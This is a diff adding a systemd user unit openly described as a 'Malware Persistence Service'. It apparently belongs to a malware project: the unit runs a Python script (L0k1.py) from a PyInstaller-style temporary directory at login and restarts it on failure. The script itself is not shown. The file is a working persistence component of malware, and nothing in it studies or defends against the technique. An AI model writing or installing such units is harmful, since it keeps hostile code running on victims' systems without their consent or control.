@@ -1,0 +1,12 @@
+
+[Unit]
+Description=Malware Persistence Service (User Level)
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /tmp/_MEIDdCewt/L0k1.py
+Restart=on-failure
+
+[Install]
+WantedBy=default.target
